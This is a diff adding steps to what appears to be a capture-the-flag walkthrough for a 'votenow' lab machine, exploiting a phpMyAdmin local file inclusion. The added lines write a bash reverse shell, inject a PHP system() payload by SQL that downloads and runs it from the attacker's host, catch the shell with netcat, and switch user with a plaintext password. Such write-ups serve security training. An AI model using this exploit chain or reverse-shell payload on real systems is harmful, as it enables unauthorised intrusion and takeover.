@@ -193,6 +193,50 @@ $ cat 44928.txt
 http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k#     
 ```
 
-Perfect we can spawn a shell! 
+Perfect we can spawn a shell! We will make target download our bash file , chmod it and then run it. Let's create it:
+
+```
+$ touch shell.sh
+$ nano shell.sh 
+$ cat shell.sh 
+bash -i >& /dev/tcp/192.168.1.16/5555 0>&1
+$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Let's send this SQL query:
+
+```sql
+select '<?php system("wget 192.168.1.16/shell.sh; chmod +x shell.sh; bash shell.sh");exit;?>'
+```
+
+Now we need to find our Session ID:
+
+![](https://i.imgur.com/eWWmchj.png)
+
+Now to execute our payload we need to visit this URL:
+
+`http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_$yoursessionid`
+
+We have shell:
+
+```
+$ nc -lvp 5555
+listening on [any] 5555 ...
+bash-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Now we can switch to admin:
+
+```
+bash-4.2$ su - admin
+su - admin
+Password: Stella
+
+Last login: Sun Jun 28 00:42:34 BST 2020 on pts/0
+[admin@votenow ~]$ 
+```
+
+
 
 
